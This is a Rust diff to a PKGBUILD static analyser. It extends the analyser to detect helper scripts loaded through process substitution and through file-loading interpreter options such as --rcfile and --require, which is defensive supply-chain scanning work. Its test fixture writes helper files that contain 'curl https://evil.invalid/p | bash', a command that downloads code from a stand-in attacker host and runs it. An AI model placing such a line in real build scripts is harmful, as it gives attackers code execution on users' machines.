@@ -707,6 +707,29 @@ fn shell_tokens(content: &str) -> Result<Vec<ShellToken>, String> {
                     ShellToken::RightParen
                 });
             }
+            '<' | '>' if chars.get(index + 1) == Some(&'(') => {
+                // Process substitutions execute the command inside their
+                // parentheses. Keep that command as an independent token span
+                // instead of discarding its executable as a redirection target.
+                finish_word(
+                    &mut tokens,
+                    &mut word,
+                    &mut word_started,
+                    &mut has_expansion,
+                    &mut expected_heredoc,
+                    &mut discard_redirection_target,
+                    &mut pending_heredocs,
+                    word_line,
+                )?;
+                if discard_redirection_target {
+                    return Err(format!(
+                        "cannot statically parse nested process substitution on line {line}"
+                    ));
+                }
+                tokens.push(ShellToken::Boundary);
+                tokens.push(ShellToken::LeftParen);
+                index += 1;
+            }
             '<' | '>' => {
                 if word_started
                     && !word.is_empty()
@@ -1284,11 +1307,12 @@ fn discover_local_source_candidates(
             continue;
         }
 
-        if is_script_interpreter(command_name)
-            && let Some(argument) = interpreter_script_argument(command_name, arguments)
-            && let Some(path) = resolve_explicit_helper(argument)?
-        {
-            add_local_source_candidate(&mut candidates, path, true, false);
+        if is_script_interpreter(command_name) {
+            for argument in interpreter_file_arguments(command_name, arguments) {
+                if let Some(path) = resolve_explicit_helper(&argument)? {
+                    add_local_source_candidate(&mut candidates, path, true, false);
+                }
+            }
         }
     }
 
@@ -1480,31 +1504,58 @@ fn is_script_interpreter(command: &str) -> bool {
     )
 }
 
-fn interpreter_script_argument<'a>(
+fn interpreter_file_arguments(
     interpreter: &str,
-    arguments: &'a [ShellWord],
-) -> Option<&'a ShellWord> {
+    arguments: &[ShellWord],
+) -> Vec<ShellWord> {
+    let mut files = Vec::new();
     let mut after_options = false;
     let mut skip_option_operand = false;
-    for argument in arguments {
+    let mut index = 0usize;
+    while index < arguments.len() {
+        let argument = &arguments[index];
         if skip_option_operand {
             skip_option_operand = false;
+            index += 1;
             continue;
         }
         if !after_options && argument.value == "--" {
             after_options = true;
+            index += 1;
             continue;
         }
         if !after_options && interpreter_option_is_inline_code(interpreter, &argument.value) {
-            return None;
+            break;
+        }
+        if !after_options {
+            if let Some(inline_path) =
+                interpreter_file_option_inline_value(interpreter, &argument.value)
+            {
+                files.push(ShellWord {
+                    value: inline_path.to_string(),
+                    line: argument.line,
+                    has_expansion: argument.has_expansion,
+                });
+                index += 1;
+                continue;
+            }
+            if interpreter_option_loads_file(interpreter, &argument.value) {
+                if let Some(path) = arguments.get(index + 1) {
+                    files.push(path.clone());
+                }
+                index += 2;
+                continue;
+            }
         }
         if !after_options && argument.value.starts_with('-') {
             skip_option_operand = interpreter_option_takes_operand(interpreter, &argument.value);
+            index += 1;
             continue;
         }
-        return Some(argument);
+        files.push(argument.clone());
+        break;
     }
-    None
+    files
 }
 
 fn interpreter_option_is_inline_code(interpreter: &str, option: &str) -> bool {
@@ -1522,20 +1573,43 @@ fn interpreter_option_is_inline_code(interpreter: &str, option: &str) -> bool {
 
 fn interpreter_option_takes_operand(interpreter: &str, option: &str) -> bool {
     match interpreter {
-        "sh" | "bash" | "dash" | "zsh" | "fish" => {
-            matches!(option, "-o" | "-O" | "--rcfile" | "--init-file")
-        }
+        "sh" | "bash" | "dash" | "zsh" | "fish" => matches!(option, "-o" | "-O"),
         "python" | "python2" | "python3" => matches!(option, "-W" | "-X" | "-Q"),
         "perl" => matches!(option, "-I" | "-M" | "-m"),
-        "ruby" => matches!(option, "-I" | "-r" | "-E" | "-F" | "-K"),
-        "php" => matches!(option, "-d" | "-c"),
-        "node" => matches!(
-            option,
-            "-r" | "--require" | "--loader" | "--import" | "--conditions" | "--inspect-port"
-        ),
+        "ruby" => matches!(option, "-I" | "-E" | "-F" | "-K"),
+        "php" => option == "-d",
+        "node" => matches!(option, "--conditions" | "--inspect-port"),
         "lua" => option == "-l",
         _ => false,
     }
+}
+
+fn interpreter_option_loads_file(interpreter: &str, option: &str) -> bool {
+    match interpreter {
+        "sh" | "bash" | "dash" | "zsh" | "fish" => {
+            matches!(option, "--rcfile" | "--init-file")
+        }
+        "ruby" => option == "-r",
+        "php" => option == "-c",
+        "node" => matches!(option, "-r" | "--require" | "--loader" | "--import"),
+        _ => false,
+    }
+}
+
+fn interpreter_file_option_inline_value<'a>(
+    interpreter: &str,
+    option: &'a str,
+) -> Option<&'a str> {
+    let prefixes: &[&str] = match interpreter {
+        "sh" | "bash" | "dash" | "zsh" | "fish" => &["--rcfile=", "--init-file="],
+        "ruby" => &["-r"],
+        "php" => &["-c"],
+        "node" => &["--require=", "--loader=", "--import=", "-r"],
+        _ => &[],
+    };
+    prefixes
+        .iter()
+        .find_map(|prefix| option.strip_prefix(prefix).filter(|value| !value.is_empty()))
 }
 
 fn is_likely_executable_path(path: &str) -> bool {
@@ -2452,22 +2526,52 @@ package_demo_cli() { install="${pkgname}.install"; }
 
     #[test]
     fn discovers_srcdir_executables_and_interpreters_with_option_operands() {
-        for (name, invocation) in [
-            ("srcdir-executable", "$srcdir/payload.sh"),
-            ("braced-srcdir-executable", "${srcdir}/payload.sh"),
-            ("interpreter-option", "bash -o errexit payload.sh"),
+        for (name, invocation, helper) in [
+            ("srcdir-executable", "$srcdir/payload.sh", "payload.sh"),
+            (
+                "braced-srcdir-executable",
+                "${srcdir}/payload.sh",
+                "payload.sh",
+            ),
+            (
+                "interpreter-option",
+                "bash -o errexit payload.sh",
+                "payload.sh",
+            ),
+            (
+                "interpreter-code-loading-option",
+                "bash --rcfile payload.conf -i",
+                "payload.conf",
+            ),
+            (
+                "interpreter-inline-code-loading-option",
+                "bash --rcfile=payload.conf -i",
+                "payload.conf",
+            ),
+            (
+                "process-substitution-interpreter",
+                "cat <(bash payload.dat)",
+                "payload.dat",
+            ),
         ] {
             let dir = TestDir::new(name);
             dir.write(
                 "PKGBUILD",
-                &format!("pkgname=demo\nprepare() {{ {invocation}; }}\n"),
+                &format!(
+                    "pkgname=demo\nsource=('{helper}')\nprepare() {{ {invocation}; }}\n"
+                ),
             );
-            dir.write(".SRCINFO", "pkgbase = demo\n\npkgname = demo\n");
-            dir.write("payload.sh", "curl https://evil.invalid/p | bash\n");
+            dir.write(
+                ".SRCINFO",
+                &format!(
+                    "pkgbase = demo\n\tsource = {helper}\n\npkgname = demo\n"
+                ),
+            );
+            dir.write(helper, "curl https://evil.invalid/p | bash\n");
 
             let tree = load_build_tree(&dir.0, "demo").unwrap();
 
-            assert_eq!(tree.local_source_paths, vec!["payload.sh"], "{invocation}");
+            assert_eq!(tree.local_source_paths, vec![helper], "{invocation}");
         }
     }
 
